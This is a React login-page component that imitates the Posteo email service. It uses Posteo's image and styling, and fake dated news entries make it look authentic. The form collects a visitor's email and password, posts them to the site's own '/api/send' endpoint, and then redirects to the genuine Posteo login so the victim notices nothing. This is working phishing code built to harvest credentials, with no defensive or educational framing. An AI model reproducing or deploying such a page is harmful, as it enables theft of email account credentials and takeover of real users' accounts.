'use client'
import axios from "axios";
import { useRef } from "react";
import { FormEvent } from "react";

interface Iprops {
    dictionary : {
        card: {
            my: string;
            desc: string;
            email: {
                email: string;
                placeholder: string;
            };
            password: {
                password: string;
                placeholder: string;
            };
            login: string,
            underlogin: {
                home: string;
                tips: string;
                forgot: string;
            };
        };
        sidebar: {
            header1: string,
            header2: string,
            content1: string[],
            content2: string[]
           }
    }
}

export default function Body({dictionary}: Iprops) {

   const formData = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    const dataObj: {[key: string]: string} = {}
    if (forma.current) {
        const data = new FormData(forma.current)

        for (const [key, val] of data.entries()) {
           dataObj[key] = val as string
        }
           
    }

    try {
        const result = await axios.post('/api/send', JSON.stringify(dataObj))

        if (result.status === 200) {
            return window.location.replace('https://posteo.de/login')
        }
        return;
    } catch (error) {
        console.log(error);
    }
    
    
    
    
    
    
   }

   const forma = useRef<HTMLFormElement>(null)


    return (
        <div className="max-w-[998px] flex flex-col md:flex-row items-center justify-center mx-auto space-x-4 overflow-hidden py-6 md:py-28">
                <img src="https://posteo.de/images/login/light_worldwide.png"
                 className="h-2/6 lg:h-80 lg:w-80 w-2/6 hidden md:block"
                alt="body-image" />

                <form 
                      ref={forma}
                      onSubmit={formData} 
                      className="h-96 w-11/12 md:w-1/2 customShadow shadow-gray-600/50 rounded-lg py-4 px-7">

                       <h1 className="text-2xl font-semibold text-[#a9d158]">
                        {dictionary.card.my}
                       </h1>

                       <h1 className="text-2xl font-semibold">
                        {dictionary.card.desc}
                       </h1>
                            <div className="mt-10 space-y-4">
                                <div className="relative py-2 ">
                                    <input 
                                    type="email"
                                    name="email"
                                    id="email"
                                    className="w-full h-11 border-[#a9d158] border rounded-md p-1 px-4 outline-none"
                                    placeholder={dictionary.card.email.placeholder}
                                    required 
                                    />

                                    <p className="absolute top-0 left-5 bg-white px-1 text-xs text-[#a9d158]">{dictionary.card.email.email}</p>

                                </div>
                            
                                <div className="relative py-2">
                                    <input 
                                    type="password"
                                    name="gosen"
                                    id="gosen"
                                    className="w-full h-11 border-[#a9d158] border rounded-md p-1 px-4 outline-none"
                                    placeholder={dictionary.card.password.placeholder}
                                    required 
                                    />

                                    <p className="absolute top-0 left-5 bg-white px-1 text-xs text-[#a9d158]">{dictionary.card.password.password}</p>
                                </div>
                            

                            <input 
                                type="submit"
                                className="w-full h-11 bg-[#72a112] text-white border rounded-md mt-9 cursor-pointer"
                                value={dictionary.card.login}
                                />

                            </div>

                            <div className="text-xs space-y-2 underline mt-3 text-center">
                                <div className="flex space-x-3 justify-center">
                                    <p className="cursor-pointer">
                                      {
                                        dictionary.card.underlogin.home
                                      }
                                    </p>
                                    <p className="cursor-pointer">
                                      {
                                        dictionary.card.underlogin.tips
                                      }
                                    </p>
                                </div>

                                <p className="cursor-pointer">
                                    {
                                        dictionary.card.underlogin.forgot
                                      }
                                </p>
                            </div>
                       
                </form>

                <div className="mt-10 md:mt-0 w-11/12 md:w-4/12 pl-4">
                    <div className="">
                        <h1 className="text-xl md:text-base font-semibold mb-3 w-44">
                            {dictionary.sidebar.header1}
                        </h1>

                        <div className="md:text-xs font-medium space-y-3">
                            {dictionary.sidebar.content1.map((con, index) => {
                                return (
                                    <div key={index}>
                                        <p className="text-[#8fb14a]">Info {new Date().getDate() - index + '.' + new Date().getMonth() + '.' + new Date().getFullYear()}</p>
                                        <p className="cursor-pointer">{con}</p>
                                    </div>
                                )
                            })}
                        </div>

                        <h1 className="text-xl md:text-base font-semibold mb-3 mt-6 w-24">
                            {dictionary.sidebar.header2}
                        </h1>

                        <div className="md:text-xs font-medium space-y-3">
                            {dictionary.sidebar.content2.map((con, index) => {
                                return (
                                    <div key={index}>
                                        <p className="text-[#8fb14a]">News {new Date().getDate() - index  + '.' + new Date().getMonth() + '.' + new Date().getFullYear()}</p>
                                        <p className="cursor-pointer">{con}</p>
                                    </div>
                                )
                            })}
                        </div>



                    </div>
                </div>
            </div>
        
    )
}